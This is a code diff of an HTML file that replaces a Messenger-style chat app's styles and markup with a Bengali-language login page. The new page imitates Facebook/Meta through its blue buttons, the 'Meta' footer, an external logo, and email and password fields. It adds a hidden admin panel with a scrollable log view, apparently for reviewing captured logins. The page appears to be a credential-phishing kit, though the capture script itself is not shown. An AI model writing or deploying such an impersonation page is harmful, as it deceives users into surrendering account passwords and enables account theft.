@@ -3,2365 +3,687 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Perfect Messenger</title>
-    <!-- Tailwind CSS CDN -->
+    <title>কাস্টম লগইন ও লগিং</title>
+    <!-- Tailwind CSS CDN for utility classes -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Google Fonts: Inter for modern UI -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <!-- Lucide Icons CDN (for various UI icons) -->
-    <script src="https://unpkg.com/lucide@latest"></script>
     <style>
-        /* Universal Box Sizing for consistent layout across all elements */
-        *, *::before, *::after {
+        /* Global Reset and Font */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif; /* Using Inter font for modern look */
+        }
+
+        /* Body Styling */
+        body {
+            background: linear-gradient(to bottom right, #f5f0ff, #e6f7ff); /* Soft gradient background */
+            height: 100vh; /* Full viewport height */
+            display: flex;
+            align-items: center; /* Vertically center content */
+            justify-content: center; /* Horizontally center content */
+            padding: 0;
             box-sizing: border-box;
         }
 
-        /* Ensure html and body take full height and width of the viewport */
-        html, body {
-            height: 100%;
-            width: 100%;
-            margin: 0;
-            padding: 0;
-            font-family: 'Inter', sans-serif;
-            background-color: #f0f2f5; /* Light background for the overall page */
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            overflow-x: hidden; /* Prevent horizontal scrolling for the entire page */
-        }
-
-        /* Main container for the Messenger app - now always full screen */
-        .messenger-container {
-            width: 100%;
-            height: 100vh; /* Always take full viewport height */
-            background-color: white;
-            border-radius: 0; /* No border-radius for full screen */
-            box-shadow: none; /* No shadow for full screen */
-            overflow: hidden; /* Ensure content within the container doesn't overflow */
-            display: flex;
-            flex-direction: column; /* Default to column for mobile */
-        }
-
-        /* Dark Mode Styles */
-        body.dark .messenger-container {
-            background-color: #18191a; /* Dark background */
-        }
-        body.dark .header-section,
-        body.dark .nav-tabs-container,
-        body.dark #active-now-section,
-        body.dark #recent-chats-section,
-        body.dark #people-view,
-        body.dark #buses-view,
-        body.dark #settings-view,
-        body.dark #individual-chat-view .chat-view-header,
-        body.dark .chat-input-bar,
-        body.dark .modal-content,
-        body.dark #character-form,
-        body.dark #sidebar { /* Added sidebar for dark mode */
-            background-color: #242526; /* Darker background for sections */
-            border-color: #3a3b3c; /* Darker borders */
-        }
-        body.dark .header-section .font-bold,
-        body.dark .text-gray-800,
-        body.dark .text-gray-700,
-        body.dark .contact-name,
-        body.dark .font-semibold,
-        body.dark .suggested-reply-button,
-        body.dark .modal-content h3,
-        body.dark .modal-content p,
-        body.dark #form-title,
-        body.dark #settings-view .character-item span,
-        body.dark #sidebar h2 { /* Added sidebar h2 for dark mode */
-            color: #e4e6eb; /* Light text for dark mode */
-        }
-        body.dark .text-gray-500,
-        body.dark .text-gray-600,
-        body.dark .contact-status,
-        body.dark .status-text,
-        body.dark #character-form label,
-        body.dark #user-id-display { /* Added user-id-display for dark mode */
-            color: #b0b3b8; /* Lighter gray for secondary text */
-        }
-        body.dark .header-icons-group button,
-        body.dark .bg-gray-200,
-        body.dark .suggested-reply-button {
-            background-color: #3a3b3c; /* Darker button background */
-            color: #e4e6eb; /* Light text for buttons */
-        }
-        body.dark .header-icons-group button:hover,
-        body.dark .suggested-reply-button:hover {
-            background-color: #4e4f50; /* Even darker hover */
-        }
-        body.dark .header-section input,
-        body.dark #chat-input,
-        body.dark #character-form input,
-        body.dark #character-form textarea,
-        body.dark .modal-content input {
-            background-color: #3a3b3c; /* Darker input background */
-            color: #e4e6eb; /* Light text for inputs */
-            border-color: #4e4f50; /* Darker input border */
-        }
-        body.dark .header-section svg.absolute,
-        body.dark .text-gray-400 {
-            color: #b0b3b8; /* Lighter icon color */
-        }
-        body.dark .chat-bubble-received {
-            background-color: #3a3b3c; /* Darker received bubble */
-            color: #e4e6eb; /* Light text */
-        }
-        body.dark .chat-bubble-sent {
-            background-color: #007bff; /* Slightly adjusted blue for contrast */
-        }
-        body.dark .status-dot {
-            border-color: #242526; /* Darker border for status dot */
-        }
-        body.dark .chat-list-item:hover,
-        body.dark .people-list-item:hover,
-        body.dark #settings-view .character-item:hover {
-            background-color: #3a3b3c; /* Darker hover for list items */
-        }
-        body.dark #chat-placeholder,
-        body.dark #chat-loading,
-        body.dark #conversation-list-loading {
-            color: #b0b3b8;
-        }
-        body.dark .typing-indicator .dot {
-            background-color: #b0b3b8;
-        }
-        body.dark .custom-message-box {
-            background-color: #3a3b3c;
-            color: #e4e6eb;
-        }
-        body.dark .modal-content button {
-             background-color: #007bff;
-        }
-        body.dark .modal-content button:hover {
-             background-color: #0066cc;
-        }
-        body.dark #settings-view .character-item .actions button:first-child {
-            background-color: #007bff;
-        }
-        body.dark #settings-view .character-item .actions button:first-child:hover {
-            background-color: #0066cc;
-        }
-        body.dark #character-form button.save {
-            background-color: #28a745; /* Green for save */
-        }
-        body.dark #character-form button.save:hover {
-            background-color: #218838;
-        }
-        body.dark #character-form button.clear {
-            background-color: #6c757d; /* Gray for clear */
-        }
-        body.dark #character-form button.clear:hover {
-            background-color: #5a6268;
-        }
-        body.dark #character-form button.cancel {
-            background-color: #dc3545; /* Red for cancel */
-        }
-        body.dark #character-form button.cancel:hover {
-            background-color: #c82333;
-        }
-        body.dark #confirm-delete-button {
-            background-color: #dc3545;
-        }
-        body.dark #confirm-delete-button:hover {
-            background-color: #c82333;
-        }
-        body.dark #cancel-delete-button {
-            background-color: #6c757d;
-        }
-        body.dark #cancel-delete-button:hover {
-            background-color: #5a6268;
-        }
-        body.dark #main-content-area {
-            background-color: #18191a; /* Dark background for main content */
-        }
-        body.dark #main-content-area .bg-gray-50 {
-            background-color: #18191a; /* Ensure the chat messages area also darkens */
-        }
-        body.dark #main-content-area header {
-            background-color: #242526; /* Darker header for main content */
-            border-color: #3a3b3c;
-        }
-        body.dark #main-content-area input {
-            background-color: #3a3b3c;
-            border-color: #4e4f50;
-            color: #e4e6eb;
-        }
-        body.dark #main-content-area button.text-gray-600 {
-            color: #b0b3b8;
-        }
-        body.dark #main-content-area button.hover\:text-gray-900:hover {
-            color: #e4e6eb;
-        }
-        body.dark #main-content-area button.hover\:bg-gray-100:hover {
-            background-color: #4e4f50;
-        }
-        body.dark #main-content-area .text-gray-500 {
-            color: #b0b3b8;
-        }
-        body.dark #main-content-area .text-gray-800 {
-            color: #e4e6eb;
-        }
-        body.dark .custom-scrollbar::-webkit-scrollbar-track {
-            background: #242526; /* Darker scrollbar track */
-        }
-        body.dark .custom-scrollbar::-webkit-scrollbar-thumb {
-            background: #555; /* Darker scrollbar thumb */
-        }
-        body.dark .custom-scrollbar::-webkit-scrollbar-thumb:hover {
-            background: #777;
-        }
-
-
-        /* Specific adjustments for very small screens (e.g., 240p to 320p width) */
-        @media (max-width: 320px) {
-            .header-section { padding: 0.5rem; }
-            .header-icons-group .space-x-3 > *:not(:first-child) { margin-left: 0.25rem !important; }
-            .header-section .font-bold { font-size: 1.25rem; }
-            .header-section input { padding-top: 0.375rem; padding-bottom: 0.375rem; font-size: 0.75rem; padding-left: 2rem; }
-            .header-section svg.absolute { left: 0.5rem; height: 1rem; width: 1rem; }
-            .chat-view-header { padding: 0.5rem 0.75rem; }
-            .chat-view-header .back-button { margin-right: 0.5rem; }
-            .chat-view-header .flex-col { margin-right: 0.25rem; }
-            .chat-view-header .profile-pic-small { width: 1.75rem; height: 1.75rem; }
-            .chat-view-header .contact-name { font-size: 1rem; }
-            .chat-view-header .contact-status { font-size: 0.65rem; }
-            .chat-view-header .h-6, .chat-view-header .w-6 { height: 1.25rem; width: 1.25rem; }
-            .chat-view-header .action-icons-group .space-x-4 > *:not(:first-child) { margin-left: 0.5rem !important; }
-            .nav-tabs-container button { padding-left: 0.25rem; padding-right: 0.25rem; font-size: 0.7rem; }
-            #active-now-section { padding: 0.5rem; }
-            #active-now-list .space-x-4 > *:not(:first-child) { margin-left: 0.5rem !important; }
-            .profile-pic-large { width: 2.5rem; height: 2.5rem; }
-            .chat-list-item .profile-pic-medium { width: 2rem; height: 2rem; margin-right: 0.5rem; }
-            .chat-list-item { padding: 0.5rem 0.75rem; min-height: 3.5rem; }
-            .chat-list-item .font-semibold { font-size: 0.85rem; }
-            .chat-list-item .text-sm { font-size: 0.75rem; }
-            .chat-input-bar { padding: 0.375rem 0.5rem; }
-            .chat-input-bar input { padding: 0.3rem 0.5rem; margin-right: 0.25rem; font-size: 0.75rem; }
-            .chat-input-bar .icon { margin-left: 0.25rem; }
-            .send-button-icon { width: 1.1rem; height: 1.1rem; }
-            .chat-input-bar .h-6, .chat-input-bar .w-6 { height: 1.1rem; width: 1.1rem; }
-            .chat-bubble-received, .chat-bubble-sent { padding: 0.3rem 0.5rem; font-size: 0.75rem; }
-            .suggested-reply-button { padding: 0.2rem 0.4rem; font-size: 0.7rem; }
-            .suggested-replies-container { gap: 0.25rem; padding: 0.25rem 0.5rem; }
-        }
-
-
-        /* Styling for received chat bubbles */
-        .chat-bubble-received {
-            background-color: #e4e6eb;
-            border-radius: 18px;
-            padding: 8px 12px;
-            max-width: 75%; /* Limit width to prevent overly long bubbles */
-            overflow-wrap: break-word; /* Ensures long words break to prevent overflow */
-        }
-        /* Styling for sent chat bubbles */
-        .chat-bubble-sent {
-            background-color: #0084ff;
-            color: white;
-            border-radius: 18px;
-            padding: 8px 12px;
-            max-width: 75%; /* Limit width to prevent overly long bubbles */
-            overflow-wrap: break-word; /* Ensures long words break to prevent overflow */
-        }
-        /* General styling for message rows - THIS IS WHERE SPACING IS FIXED */
-        .message-row {
-            display: flex;
-            align-items: flex-end; /* Align bubbles to the bottom of the profile pic */
-            margin-bottom: 15px; /* Increased margin for clear separation */
-        }
-        .message-row.sent {
-            justify-content: flex-end; /* Align sent messages to the right */
-        }
-        .message-row.received {
-            justify-content: flex-start; /* Align received messages to the left */
-        }
-
-        /* Profile picture styling for all sizes - ENSURE CIRCULARITY */
-        /* Using !important to ensure these styles take precedence */
-        .profile-pic-small {
-            width: 32px;
-            height: 32px;
-            margin-right: 8px;
-            border-radius: 50% !important; /* Make it perfectly circular */
-            object-fit: cover !important; /* Ensures the image covers the area without distortion */
-            flex-shrink: 0; /* Prevent shrinking */
-        }
-        .profile-pic-medium {
-            width: 48px;
-            height: 48px;
-            margin-right: 12px;
-            border-radius: 50% !important;
-            object-fit: cover !important;
-            flex-shrink: 0;
-        }
-        .profile-pic-large {
-            width: 60px;
-            height: 60px;
-            margin-right: 12px;
-            border-radius: 50% !important;
-            object-fit: cover !important;
-            flex-shrink: 0;
-        }
-
-        /* Styling for "Sent" / "Seen" indicators */
-        .reaction-text {
-            font-size: 0.75rem; /* text-xs */
-            color: #6b7280; /* text-gray-500 */
-            margin-top: -4px;
-            margin-bottom: 4px;
-        }
-        /* Styling for individual chat list items */
-        .chat-list-item {
-            display: flex;
-            align-items: center; /* Vertically center items */
-            padding: 12px 16px;
-            min-height: 70px; /* Minimum height for consistent spacing */
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-        .chat-list-item:hover {
-            background-color: #f0f2f5;
-        }
-        /* Status dot for active users */
-        .chat-list-item .status-dot {
-            width: 10px;
-            height: 10px;
-            background-color: #31a24c; /* green-500 */
-            border: 2px solid white;
-            border-radius: 50%;
-            position: absolute;
-            bottom: 0;
-            right: 0;
-        }
-        .chat-list-item .status-dot.red {
-            background-color: #ef4444; /* red-500 */
-        }
-        .chat-list-item .status-dot.offline {
-            background-color: transparent; /* No dot for offline */
-            border: none;
-        }
-        .chat-list-item .profile-pic-container {
+        /* Login Container Styling */
+        .login-container {
+            width: 90%;
+            max-width: 400px; /* Max width for larger screens */
+            text-align: center;
             position: relative;
-            flex-shrink: 0; /* Prevent container from shrinking */
-            margin-right: 12px;
         }
 
-        /* Truncate text in recent chats list */
-        .chat-list-item .flex-1 p {
-            white-space: nowrap; /* Keep text on a single line */
-            overflow: hidden; /* Hide overflowing text */
-            text-overflow: ellipsis; /* Add "..." for truncated text */
+        /* Language Selector Button */
+        .language {
+            font-size: 16px;
+            color: #000;
+            font-weight: 300; /* Extra light font weight */
+            text-align: center;
+            margin: 0 auto 30px auto; /* Centered with bottom margin */
+            display: block;
+            cursor: pointer;
         }
 
-        /* Styling for the chat messages display area */
-        .chat-messages-display {
-            flex-grow: 1; /* Allows it to take available vertical space */
-            overflow-y: auto; /* Enable vertical scrolling if content overflows */
+        /* Logo Styling */
+        .logo img {
+            width: 65px;
+            height: 65px;
+            margin: 40px auto 60px; /* Centered with top/bottom margins */
+            border-radius: 10px; /* Rounded corners for the logo */
+        }
+
+        /* Form Input Fields */
+        .form input {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            font-size: 16px;
+            border-radius: 10px; /* Rounded input fields */
+            border: 1px solid #ccc;
+            outline: none;
+        }
+
+        /* Login Button */
+        .login-btn {
+            background-color: #1877f2; /* Facebook blue */
+            color: white;
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 24px; /* Pill-shaped button */
+            font-size: 16px;
+            margin-top: 10px;
+            margin-bottom: 14px;
+            cursor: pointer;
+            transition: background-color 0.3s ease; /* Smooth hover effect */
+        }
+        .login-btn:hover {
+            background-color: #106ad0; /* Darker blue on hover */
+        }
+
+        /* Forgot Password Link */
+        .forgot {
+            color: #1877f2;
+            font-size: 15px;
+            margin-bottom: 40px;
+            text-decoration: none; /* No default underline */
+            cursor: pointer;
+            display: block;
+            transition: text-decoration 0.3s ease;
+        }
+        .forgot:hover {
+            text-decoration: underline; /* Underline on hover */
+        }
+
+        /* Create New Account Button */
+        .create-btn {
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            border-radius: 24px;
+            border: 1.5px solid #1877f2; /* Blue border */
+            background: white;
+            color: #1877f2;
+            margin-bottom: 30px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+        .create-btn:hover {
+            background-color: #1877f2; /* Blue background on hover */
+            color: white; /* White text on hover */
+        }
+
+        /* Meta Text */
+        .meta {
+            font-size: 16px;
+            color: #777;
+        }
+
+        /* Language Popup Styling */
+        .language-popup {
+            position: fixed;
+            bottom: -100%; /* Initially hidden below viewport */
+            left: 0;
+            width: 100%;
+            background: white;
+            border-radius: 20px 20px 0 0; /* Rounded top corners */
+            box-shadow: 0 -2px 20px rgba(0,0,0,0.2); /* Shadow at the top */
+            transition: bottom 0.3s ease; /* Smooth slide-up animation */
+            z-index: 999;
+            max-height: 80vh; /* Max height to allow scrolling */
+            overflow-y: auto; /* Enable vertical scrolling */
+        }
+        .language-popup.active {
+            bottom: 0; /* Slide up to show */
+        }
+        .lang-header {
             padding: 16px;
+            font-size: 18px;
+            font-weight: bold;
             display: flex;
-            flex-direction: column;
-        }
-        /* Custom scrollbar for chat messages display */
-        .chat-messages-display.custom-scrollbar::-webkit-scrollbar {
-            width: 8px;
-        }
-        .chat-messages-display.custom-scrollbar::-webkit-scrollbar-track {
-            background: #f1f1f1;
-            border-radius: 10px;
-        }
-        .chat-messages-display.custom-scrollbar::-webkit-scrollbar-thumb {
-            background: #888;
-            border-radius: 10px;
-        }
-        .chat-messages-display.custom-scrollbar::-webkit-scrollbar-thumb:hover {
-            background: #555;
-        }
-
-
-        /* Styling for the chat input bar */
-        .chat-input-bar {
-            padding: 12px 16px;
-            border-top: 1px solid #e5e7eb; /* border-gray-200 */
-            display: flex;
+            justify-content: space-between;
             align-items: center;
-            background-color: white;
-            flex-shrink: 0; /* Prevent input bar from shrinking */
+            border-bottom: 1px solid #eee; /* Separator line */
         }
-        .chat-input-bar input {
-            flex-grow: 1; /* Allows input field to take available space */
+        .lang-header button {
+            background: none;
             border: none;
-            outline: none;
-            padding: 8px 12px;
-            border-radius: 20px;
-            background-color: #f0f2f5;
-            margin-right: 10px;
-        }
-        .chat-input-bar .icon {
             font-size: 24px;
-            color: #0084ff;
-            margin-left: 8px;
             cursor: pointer;
-            flex-shrink: 0; /* Prevent icons from shrinking */
         }
-        /* Specific styles for chat view header */
-        .chat-view-header {
+        .lang-list {
+            padding: 16px;
+            text-align: left;
+        }
+        .lang-list label {
+            display: block;
+            margin: 10px 0;
+            font-size: 16px;
             display: flex;
             align-items: center;
-            padding: 12px 16px;
-            border-bottom: 1px solid #e5e7eb;
-            background-color: white;
-            min-height: 56px; /* Ensure header has a minimum height */
-            flex-shrink: 0; /* Prevent header from shrinking */
-        }
-        .chat-view-header .back-button {
-            margin-right: 12px;
             cursor: pointer;
-            color: #0084ff;
         }
-        .chat-view-header .contact-name {
-            font-weight: 600; /* semibold */
-            color: #1a202c; /* gray-800 */
-            font-size: 1.125rem; /* text-lg */
-            line-height: 1.2; /* Better line height for name */
-        }
-        /* Flex column for contact name and status in header */
-        .chat-view-header .flex-col {
-            flex-grow: 1; /* Allows this column to take available space */
-            min-width: 0; /* Crucial for allowing content (like long names) to shrink/truncate */
-            margin-right: 8px; /* Add some margin to the right of name/status */
-        }
-        .chat-view-header .contact-status {
-            font-size: 0.75rem;
-            color: #6b7280;
-        }
-        /* Typing indicator animation */
-        .typing-indicator {
-            display: flex;
-            align-items: center;
-            margin-top: 5px;
-            margin-bottom: 10px;
-            align-self: flex-start;
-        }
-        .typing-indicator .dot {
-            width: 8px;
-            height: 8px;
-            background-color: #b0b3b8;
-            border-radius: 50%;
-            margin: 0 2px;
-            animation: bounce 1.4s infinite ease-in-out both;
-        }
-        .typing-indicator .dot:nth-child(1) { animation-delay: -0.32s; }
-        .typing-indicator .dot:nth-child(2) { animation-delay: -0.16s; }
-        .typing-indicator .dot:nth-child(3) { animation-delay: 0s; }
-
-        @keyframes bounce {
-            0%, 80%, 100% { transform: scale(0); }
-            40% { transform: scale(1); }
-        }
-        /* Messenger-like send button SVG */
-        .send-button-icon {
-            width: 24px;
-            height: 24px;
-            fill: #0084ff; /* Messenger blue */
-        }
-        /* People list specific styles */
-        .people-list-item {
-            display: flex;
-            align-items: center;
-            padding: 12px 16px;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-        .people-list-item:hover {
-            background-color: #f0f2f5;
-        }
-        .people-list-item .contact-name {
-            font-weight: 500;
-            color: #1a202c;
-        }
-        .people-list-item .status-text {
-            font-size: 0.875rem; /* text-sm */
-            color: #6b7280;
-            margin-left: 8px;
-        }
-        /* Suggested replies container styling */
-        .suggested-replies-container {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 8px;
-            padding: 8px 16px;
-            background-color: white;
-            border-top: 1px solid #e5e7eb;
-            justify-content: flex-end; /* Align suggestions to the right */
-            flex-shrink: 0; /* Prevent container from shrinking */
-        }
-        .suggested-reply-button {
-            background-color: #e4e6eb;
-            color: #1a202c;
-            border-radius: 18px;
-            padding: 6px 10px;
-            font-size: 0.875rem;
-            cursor: pointer;
-            transition: background-color 0.2s;
-            border: none;
-            outline: none;
-        }
-        .suggested-reply-button:hover {
-            background-color: #d1d5db;
-        }
-        /* Hide scrollbars for specific elements for a cleaner look */
-        #active-now-list {
-            -webkit-overflow-scrolling: touch; /* Smooth scrolling on iOS */
-            scrollbar-width: none; /* Hide scrollbar for Firefox */
-        }
-        #active-now-list::-webkit-scrollbar {
-            display: none; /* Hide scrollbar for Chrome, Safari, Opera */
+        .lang-list input[type="checkbox"] {
+            margin-right: 10px;
+            transform: scale(1.2); /* Slightly larger checkbox */
         }
 
-        /* Custom Message Box styles */
-        .custom-message-box {
+        /* Custom Message Box Styling */
+        .message-box {
             position: fixed;
             top: 50%;
             left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: #333;
-            color: white;
-            padding: 15px 25px;
-            border-radius: 8px;
-            z-index: 1000;
-            font-size: 1rem;
-            text-align: center;
-            opacity: 0;
-            transition: opacity 0.3s ease-in-out;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-        }
-
-        /* Modal Styles (for Password and Confirmation) */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.6);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-
-        .modal-content {
-            background-color: white;
+            transform: translate(-50%, -50%); /* Center horizontally and vertically */
+            background: white;
             padding: 25px;
             border-radius: 10px;
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            z-index: 1000; /* Above other elements */
+            text-align: center;
+            display: none; /* Hidden by default */
+            max-width: 90%;
+            min-width: 250px;
+        }
+        .message-box p {
+            margin-bottom: 15px;
+            font-size: 18px;
+            color: #333;
+        }
+        .message-box button {
+            margin-top: 15px;
+            padding: 10px 20px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .message-box button:hover {
+            background-color: #106ad0;
+        }
+
+        /* Admin Panel Styling (Card-like appearance) */
+        #adminPanel {
             width: 90%;
             max-width: 400px;
+            background: white; /* Card background */
+            padding: 20px;     /* Card padding */
+            border-radius: 15px; /* Rounded corners */
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); /* Soft shadow */
             text-align: center;
+            display: none; /* Hidden by default */
         }
-
-        .modal-content input[type="password"],
-        .modal-content input[type="text"] { /* Added text type for general modal input */
+        #adminPanel h2 {
+            margin-bottom: 15px;
+            color: #333;
+            font-size: 20px;
+            font-weight: 600;
+        }
+        #adminPanel input[type="password"], #adminPanel input[type="email"] {
             width: 100%;
-            padding: 10px;
-            margin: 15px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 1rem;
+            padding: 12px;
+            margin-bottom: 15px;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s ease;
         }
-
-        .modal-content button {
-            background-color: #0084ff;
+        #adminPanel input[type="password"]:focus, #adminPanel input[type="email"]:focus {
+            border-color: #4CAF50; /* Green border on focus */
+        }
+        #adminPanel button {
+            background-color: #4CAF50; /* Green button */
             color: white;
-            padding: 10px 20px;
-            border-radius: 5px;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
             cursor: pointer;
-            font-size: 1rem;
-            transition: background-color 0.2s;
-            border: none; /* Ensure no default button border */
+            transition: background-color 0.3s ease;
+        }
+        #adminPanel button:hover {
+            background-color: #45a049; /* Darker green on hover */
         }
 
-        .modal-content button:hover {
-            background-color: #0066cc;
+        /* Log Display Area */
+        .log-display {
+            margin-top: 20px;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+            text-align: left;
+            max-height: 400px; /* Max height for scrollable logs */
+            overflow-y: auto; /* Enable vertical scrolling */
+            border-radius: 8px;
         }
-
-        /* Settings View Specific Styles */
-        #settings-view .character-item {
-            display: flex;
-            align-items: center;
-            padding: 10px 15px;
-            border-bottom: 1px solid #eee;
-            background-color: white;
-        }
-        #settings-view .character-item:hover {
-            background-color: #f9f9f9;
-        }
-        #settings-view .character-item img {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            object-fit: cover;
-            margin-right: 10px;
-        }
-        #settings-view .character-item .actions button {
-            padding: 5px 10px;
-            border-radius: 5px;
-            font-size: 0.875rem;
-            cursor: pointer;
-            transition: background-color 0.2s;
-            border: none; /* Ensure no default button border */
-        }
-        #settings-view .character-item .actions button:first-child {
-            background-color: #0084ff;
-            color: white;
-            margin-right: 8px;
-        }
-        #settings-view .character-item .actions button:first-child:hover {
-            background-color: #0066cc;
-        }
-        #settings-view .character-item .actions button:last-child {
-            background-color: #ef4444;
-            color: white;
-        }
-        #settings-view .character-item .actions button:last-child:hover {
-            background-color: #dc2626;
-        }
-        #character-form input[type="text"],
-        #character-form textarea {
-            width: 100%;
+        .log-entry {
+            background: #f9f9f9;
+            border: 1px solid #e0e0e0;
             padding: 10px;
+            border-radius: 8px;
             margin-bottom: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 0.9rem;
+            word-wrap: break-word; /* Ensure long words wrap */
         }
-        #character-form textarea {
-            min-height: 80px;
-            resize: vertical;
+        .log-entry strong {
+            color: #555;
+            font-weight: 600;
         }
-        #character-form button {
-            padding: 10px 15px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 0.9rem;
-            transition: background-color 0.2s;
-            margin-right: 10px;
-            border: none; /* Ensure no default button border */
+        .log-entry p {
+            margin: 5px 0;
+            line-height: 1.4;
+            color: #444;
         }
-        #character-form button.save {
-            background-color: #22c55e;
-            color: white;
-        }
-        #character-form button.save:hover {
-            background-color: #16a34a;
-        }
-        #character-form button.clear {
-            background-color: #6b7280;
-            color: white;
-        }
-        #character-form button.clear:hover {
-            background-color: #4b5563;
-        }
-        #character-form button.cancel {
-            background-color: #ef4444;
-            color: white;
-        }
-        #character-form button.cancel:hover {
-            background-color: #dc2626;
-        }
-        /* Mobile sidebar overlay */
-        .sidebar-overlay {
-            background-color: rgba(0, 0, 0, 0.5);
-            z-index: 40;
-        }
-
-        /* Responsive Layout for Messenger Container */
-        @media (min-width: 768px) { /* Medium screens and up */
-            .messenger-container {
-                flex-direction: row; /* Horizontal layout for desktop */
-            }
-        }
-
-        /* Sidebar specific styles */
-        #sidebar {
-            flex-shrink: 0; /* Prevent sidebar from shrinking */
-            width: 100%; /* Default full width on mobile */
-            max-width: 280px; /* Max width for sidebar on desktop */
-        }
-        @media (min-width: 768px) {
-            #sidebar {
-                transform: translateX(0); /* Always visible on desktop */
-                position: relative; /* Not fixed on desktop */
-                width: 280px; /* Fixed width on desktop */
-                border-right: 1px solid #e5e7eb;
-                box-shadow: none; /* No shadow on desktop */
-            }
-        }
-
-        /* Main content area */
-        #main-content-area {
-            flex-grow: 1; /* Takes remaining space */
-            background-color: #f0f2f5; /* Light background */
-        }
-        @media (min-width: 768px) {
-            #main-content-area {
-                border-top-left-radius: 0; /* No rounded corner when sidebar is present */
-                border-bottom-left-radius: 0;
-            }
+        .log-entry:last-child {
+            margin-bottom: 0; /* No bottom margin for the last log entry */
         }
     </style>
 </head>
 <body>
-    <!-- Loading Overlay -->
-    <div id="loading-overlay" class="fixed inset-0 bg-gray-100 flex items-center justify-center z-50">
-        <svg class="animate-spin h-10 w-10 text-indigo-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-        </svg>
-        <p class="ml-3 text-lg text-gray-700">Loading Messenger...</p>
+    <!-- Main Login Content -->
+    <div class="login-container" id="mainLoginContent">
+        <div class="language" onclick="openLangPopup()">English (US) ⌄</div>
+        <div class="logo">
+            <img src="https://i.postimg.cc/zG8Bvgyn/CC-20250602-123222.png" alt="Custom Logo" onerror="this.onerror=null;this.src='https://placehold.co/80x80/cccccc/333333?text=Logo';">
+        </div>
+        <div class="form">
+            <input type="text" id="loginEmailInput" placeholder="মোবাইল নম্বর অথবা ইমেল">
+            <input type="password" id="loginPasswordInput" placeholder="পাসওয়ার্ড">
+            <button class="login-btn" id="loginBtn">লগ ইন করুন</button>
+            <a href="#" class="forgot" id="forgotPasswordLink">পাসওয়ার্ড ভুলে গেছেন?</a>
+            <button class="create-btn" id="createAccountBtn">নতুন অ্যাকাউন্ট তৈরি করুন</button>
+        </div>
+        <div class="meta">Meta</div>
     </div>
 
-    <!-- Error Message Display -->
-    <div id="error-message" class="hidden fixed inset-0 bg-red-100 text-red-800 flex flex-col items-center justify-center p-4 rounded-xl z-50">
-        <p class="text-xl font-bold mb-4">Error:</p>
-        <p id="error-text" class="text-center"></p>
-        <p class="mt-4 text-sm">Please refresh the page or contact support.</p>
-    </div>
-
-    <!-- Main App Container -->
-    <div class="messenger-container">
-        <!-- Sidebar Overlay for Mobile -->
-        <div id="sidebar-overlay" class="hidden fixed inset-0 sidebar-overlay md:hidden" onclick="toggleMobileSidebar()"></div>
-
-        <!-- Sidebar for conversations/contacts -->
-        <aside id="sidebar" class="fixed inset-y-0 left-0 bg-white w-64 p-4 shadow-lg z-50 transform -translate-x-full transition-transform duration-300 ease-in-out
-                                   md:relative md:translate-x-0 md:flex-shrink-0 md:w-64 md:border-r md:border-gray-200 flex flex-col">
-            <div class="p-4 border-b border-gray-200 flex items-center justify-between">
-                <h2 class="text-xl font-bold text-indigo-700">Chats</h2>
-                <!-- Close button for mobile menu -->
-                <button id="close-sidebar-btn" class="md:hidden text-gray-500 hover:text-gray-700 p-2 rounded-md focus:outline-none focus:ring-2 focus:ring-indigo-500" aria-label="Close menu">
-                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
-                </button>
-            </div>
-            <div class="flex-1 flex flex-col">
-                <!-- Header Section (now inside sidebar) -->
-                <div class="p-4 bg-white border-b border-gray-200 flex-shrink-0 header-section">
-                    <div class="flex items-center justify-between mb-3">
-                        <div class="font-bold text-2xl text-gray-800">Chats</div>
-                        <div class="flex space-x-3 header-icons-group">
-                            <button class="bg-gray-200 p-2 rounded-full" id="settings-button">
-                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-                                    <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16" />
-                                </svg>
-                            </button>
